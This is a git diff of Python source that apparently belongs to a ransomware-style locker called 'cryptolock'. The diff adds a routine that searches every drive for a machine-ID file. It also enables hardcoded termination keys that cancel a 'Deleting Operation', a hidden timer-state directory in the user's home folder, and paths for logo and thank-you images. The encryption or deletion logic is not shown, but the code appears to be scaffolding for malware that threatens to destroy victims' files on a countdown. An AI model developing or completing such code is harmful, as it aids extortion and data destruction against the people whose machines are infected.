@@ -39,26 +39,49 @@ def ensure_time_dir_exist():
         os.makedirs(TIME_DIR)
 
 
-# Create Function to Load Machine ID
+# Create Function to Load Machine ID from all drives on the machine
 def load_machine_id():
-    pass
+    # Generate a list of all existence drives on the machine
+    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{x}:\\")]
+
+    # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
+    for drive in drives:
+        machineIdPath = os.path.join(drive, 'Machine_id.txt')
+        if os.path.exists(machineIdPath):
+            try:
+                with open(machineIdPath, 'r') as file:
+                    machineId = file.read().strip()
+                    # debug print
+                    print(f"[+] Debug: Machine Id loaded successfully from {machineIdPath}: {machineId}")
+                    return machineId
+            except FileNotFoundError:
+                continue
+    # debug print
+    print(f"[-] Debug: Can't load machine id's, No valid Machine ID found. ")
+    return None
 
 
 
 
+# Global constants
+TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
+# TERMINATION_KEY = "yakuza"
+SECONDARY_TERMINATION_KEY = "stop"
+# SECONDARY_TERMINATION_KEY = "davood"
 
-
-#Global constants
-#Termination keys used to close app and cancel Deleting Operation
-# TERMINATION_KEY = "bingo"
-# SECONDARY_TERMINATION_KEY = "stop"
-#
+# get the current user's home directory
 HOME_DIR = os.path.expanduser('~')
-TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
-# TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
-# ICON_PATH = resource_path("img/app_icon.ico")
-# LOGO_PATH = resource_path("img/logo.png")
-# THANKS_PATH = resource_path("img/thank-you.png")
+
+# Create Path of Time Directory based on the current user's home directory
+TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time') # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')
+
+# Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
+TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
+
+# Path of application icons and images
+ICON_PATH = resource_path("img/app_icon.ico")
+LOGO_PATH = resource_path("img/logo.png")
+THANKS_PATH = resource_path("img/thank_you.png")
 
 
 
